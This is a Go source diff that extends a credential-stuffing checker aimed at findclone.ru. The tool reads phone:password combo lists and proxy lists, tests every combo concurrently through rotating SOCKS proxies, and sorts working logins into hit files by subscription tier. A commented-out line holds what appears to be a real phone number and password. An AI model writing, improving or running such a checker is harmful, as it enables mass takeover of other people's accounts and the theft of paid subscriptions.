@@ -12,8 +12,12 @@ import (
 	"os"
 	"strconv"
 	"strings"
+	"syscall"
 	"time"
+	"unsafe"
 
+	"github.com/cheggaaa/pb/v3"
+	"github.com/gammazero/workerpool"
 	"h12.io/socks"
 )
 
@@ -43,19 +47,39 @@ Referer: https://findclone.ru/
 Accept-Encoding: gzip, deflate, br
 Accept-Language: ru,en-GB;q=0.9,en;q=0.8`
 
+	// Format log as you want
 	LOG = "{phone}:{password} | Type: {type} | Searches left: {searches_left} | Period: {period}"
 
-	BAD_STATUS     = "Wrong password"
+	CONSOLE_TITLE = "Failed: %d | Hits: %d | Trial: %d | Basic: %d | Medium: %d | Premium: %d | Expired: %d"
+
+	BAD_STATUS     = "bad"
 	GOOD_STATUS    = "success"
 	BLOCK_STATUS   = "block"
 	EXPIRED_STATUS = "expired"
 
 	GOOD_DEF = "\"session_key\""
+	BAD_DEF  = "Wrong password"
 
 	CONN_ERROR = "conn_error"
 )
 
-var headers = make(http.Header, 0)
+var (
+	resultsPath  = ""
+	headers      = http.Header{}
+	resources    = Resources{}
+	isResultFind = false
+	hits         = 0
+	expired      = 0
+	hitsBasic    = 0
+	hitsMedium   = 0
+	hitsPremium  = 0
+	hitsTrial    = 0
+	failedNum    = 0
+
+	hitsFilename    = "Hits.txt"
+	failedFilename  = "Failed.txt"
+	expiredFilename = "Expired.txt"
+)
 
 // AccountInfo ...
 type AccountInfo struct {
@@ -76,6 +100,17 @@ type AuthData struct {
 	Proxy     string
 }
 
+// Resources ...
+type Resources struct {
+	combosPath string
+	proxyPath  string
+	proxyType  string
+	threads    int
+	timeout    int
+	combos     []string
+	proxies    []string
+}
+
 // Auther ...
 type Auther interface {
 	Login() (*AccountInfo, error)
@@ -92,70 +127,104 @@ func init() {
 	}
 }
 
-func main() {
-	//os.Setenv("HTTP_PROXY", "http://192.168.1.190:8888")
-	var filestr, proxystr, proxytype string
+// Asking for resources
+func askForRes(resources *Resources) {
 
+	var err error
 	scanner := bufio.NewScanner(os.Stdin)
 
 	r := strings.NewReplacer("\"", "")
 
 	fmt.Print("Combos: ")
 	if scanner.Scan() {
-		filestr = r.Replace(scanner.Text())
+		resources.combosPath = r.Replace(scanner.Text())
 	}
 
 	fmt.Print("Proxies: ")
 	if scanner.Scan() {
-		proxystr = scanner.Text()
+		resources.proxyPath = scanner.Text()
 	}
 
 	fmt.Print("Proxy type: ")
 	if scanner.Scan() {
-		proxytype = scanner.Text()
+		resources.proxyType = scanner.Text()
 	}
 
-	combos, err := readLines(filestr)
+	fmt.Print("Threads: ")
+	if scanner.Scan() {
+		resources.threads, _ = strconv.Atoi(scanner.Text())
+	}
+
+	fmt.Print("Timeout: ")
+	if scanner.Scan() {
+		resources.timeout, _ = strconv.Atoi(scanner.Text())
+	}
+
+	resources.combos, err = readLines(resources.combosPath)
 	if err != nil {
 		log.Fatal(err)
 	}
-	
 
-	proxies, err := readLines(proxystr)
+	resources.proxies, err = readLines(resources.proxyPath)
 	if err != nil {
 		log.Fatal(err)
 	}
-	
-	proxiesLen := len(proxies)
+}
 
-	fmt.Printf("Got %d combos\n", proxiesLen)
+func main() {
+	//os.Setenv("HTTP_PROXY", "http://192.168.1.190:8888")
 
+	askForRes(&resources)
+
+	proxiesLen, combosLen := len(resources.proxies), len(resources.combos)
 
 	proxyIndex := 0
 
+	wp := workerpool.New(resources.threads)
+
+	bar := pb.Full.Start(combosLen)
+	bar.SetRefreshRate(time.Millisecond)
+
+	// Setting standart bar template
+	tmpl := `{{string . "prefix"}}{{counters . }} {{bar . }} {{percent . }} {{speed . }} {{etime . "%s"}}/{{rtime . "%s"}}`
+
+	bar.SetTemplateString(tmpl)
+
 	// Iterating combos
-	for _, combo := range combos {
-		array := strings.Split(combo, ":")
-		user, pass := array[0], array[1]
-		conn := false
-		for !conn {
-			proxy := proxies[proxyIndex]
-			authData := AuthData{
-				Phone:     user,
-				Password:  pass,
-				Proxy:     proxy,
-				ProxyType: proxytype,
+	for i, combo := range resources.combos {
+		combo := combo
+		i := i
+		wp.Submit(func() {
+			array := strings.Split(combo, ":")
+			if len(array) != 2 {
+				return
 			}
-			result, accountInfo := authData.Login()
-			conn = authData.WorkWithAccount(result, accountInfo)
-			if proxyIndex == proxiesLen-1 {
-				proxyIndex = 0
-			} else {
-				proxyIndex++
+			user, pass := array[0], array[1]
+			conn := false
+			for !conn {
+				proxy := resources.proxies[proxyIndex]
+				authData := AuthData{
+					Phone:     user,
+					Password:  pass,
+					Proxy:     proxy,
+					ProxyType: resources.proxyType,
+				}
+				result, accountInfo := authData.Login()
+				conn = authData.WorkWithAccount(result, accountInfo, i)
+				// Check if proxyIndex is not bigger then whole proxies length
+				if proxyIndex == proxiesLen-1 {
+					proxyIndex = 0
+				} else {
+					proxyIndex++
+				}
 			}
-		}
+			// Change bar status every request
+			bar.Increment()
+		})
 
 	}
+	wp.StopWait()
+	bar.Finish()
 	//fmt.Println(login("79829280119", "Aa97evgeny"))
 }
 
@@ -177,7 +246,7 @@ func (a AuthData) Login() (string, *AccountInfo) {
 
 	client := &http.Client{
 		Transport: tr,
-		Timeout:   time.Second * 3,
+		Timeout:   time.Millisecond * time.Duration(resources.timeout),
 	}
 	resp, err := client.Do(req)
 
@@ -203,7 +272,7 @@ func (a AuthData) Login() (string, *AccountInfo) {
 			formatAccountInfo(&accountInfo)
 			return "success", &accountInfo
 		}
-	} else if strings.Contains(bodyInString, BAD_STATUS) {
+	} else if strings.Contains(bodyInString, BAD_DEF) {
 		return BAD_STATUS, &AccountInfo{}
 	} else {
 		return BLOCK_STATUS, &AccountInfo{}
@@ -212,19 +281,45 @@ func (a AuthData) Login() (string, *AccountInfo) {
 
 // Decide what to do with an auth result
 // Return boolean that says if connection was successed
-func (a AuthData) WorkWithAccount(result string, accountInfo *AccountInfo) bool {
+func (a AuthData) WorkWithAccount(result string, accountInfo *AccountInfo, i int) bool {
+	if !isResultFind {
+		resultsPath = createDirs()
+		isResultFind = true
+	}
+
 	combo := a.Phone + ":" + a.Password
 	switch result {
 	case CONN_ERROR:
-		fmt.Println("[CONN_ERR] -")
 		return false
 	case BAD_STATUS:
-		fmt.Println("[BAD]", combo)
+		failedNum++
+		writeHitsToFile(failedFilename, combo)
+		// Set number of failed combos each 100 combos
+		// or if it is setted by hits or expired value
+		if (i % 100) == 0 {
+			SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
+		}
 	case EXPIRED_STATUS:
-		fmt.Println("[EXPIRED]", combo)
+		expired++
+		writeHitsToFile(expiredFilename, combo)
+		SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
 	case GOOD_STATUS:
+		// Choose if hit have any subscription and add it to statistic
+		switch accountInfo.TypeName {
+		case "Basic":
+			hitsBasic++
+		case "Medium":
+			hitsMedium++
+		case "Premium":
+			hitsPremium++
+		case "Trial":
+			hitsTrial++
+		}
+		hits++
 		log := a.buildLog(accountInfo)
-		fmt.Println("[GOOD]", log)
+		writeHitsToFile(hitsFilename, log)
+		writeHitsToFile(accountInfo.TypeName, log)
+		SetConsoleTitle(fmt.Sprintf(CONSOLE_TITLE, failedNum, hits, hitsTrial, hitsBasic, hitsMedium, hitsPremium, expired))
 	}
 	return true
 }
@@ -264,4 +359,44 @@ func readLines(path string) ([]string, error) {
 		lines = append(lines, scanner.Text())
 	}
 	return lines, scanner.Err()
+}
+
+func SetConsoleTitle(title string) (int, error) {
+	handle, err := syscall.LoadLibrary("Kernel32.dll")
+	if err != nil {
+		return 0, err
+	}
+	defer syscall.FreeLibrary(handle)
+	proc, err := syscall.GetProcAddress(handle, "SetConsoleTitleW")
+	if err != nil {
+		return 0, err
+	}
+	r, _, err := syscall.Syscall(proc, 1, uintptr(unsafe.Pointer(syscall.StringToUTF16Ptr(title))), 0, 0)
+	return int(r), err
+}
+
+// Create dirs if aren't created
+func createDirs() string {
+	replacer := strings.NewReplacer(":", "_")
+	timeNow := time.Now()
+	date := timeNow.Format("02.01.2006")
+	dateTime := replacer.Replace(timeNow.Format("15:04:00"))
+	finalDate := fmt.Sprintf("./Results/%s/%s/", date, dateTime)
+	_ = os.Mkdir("./Results", os.ModeDir)
+	_ = os.Mkdir("./Results/"+date, os.ModeDir)
+	_ = os.Mkdir(finalDate, os.ModeDir)
+	return finalDate
+}
+
+// Write info into several files
+func writeHitsToFile(fileName, data string) {
+	// Check if fileName contains ".txt", if not add it
+	if !strings.Contains(fileName, ".txt") {
+		fileName += ".txt"
+	}
+	f, err := os.OpenFile(resultsPath+fileName, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+	if err != nil {
+		log.Fatal(err)
+	}
+	f.Write([]byte(data + "\n"))
 }
